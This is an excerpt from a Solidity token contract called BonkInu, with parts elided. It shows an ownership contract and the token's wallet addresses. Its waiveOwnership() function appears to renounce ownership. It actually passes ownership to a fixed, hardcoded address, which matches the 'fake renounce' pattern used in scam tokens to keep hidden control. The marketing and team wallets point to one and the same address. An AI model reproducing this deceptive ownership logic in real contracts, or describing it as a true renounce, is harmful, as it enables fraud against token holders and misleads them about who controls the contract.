...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x3caB598A864d2A7faC02093A6372ef05DEDA2f86));
        _owner = address(0x3caB598A864d2A7faC02093A6372ef05DEDA2f86);
    }
...
contract BonkInu is Context, IERC20, Ownable {
    ...
    string private _symbol = "BONK INU";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x08639d85071c10672bAcc3382E2493EC84b6633F);
    address payable public teamWalletAddress = payable(0x08639d85071c10672bAcc3382E2493EC84b6633F);
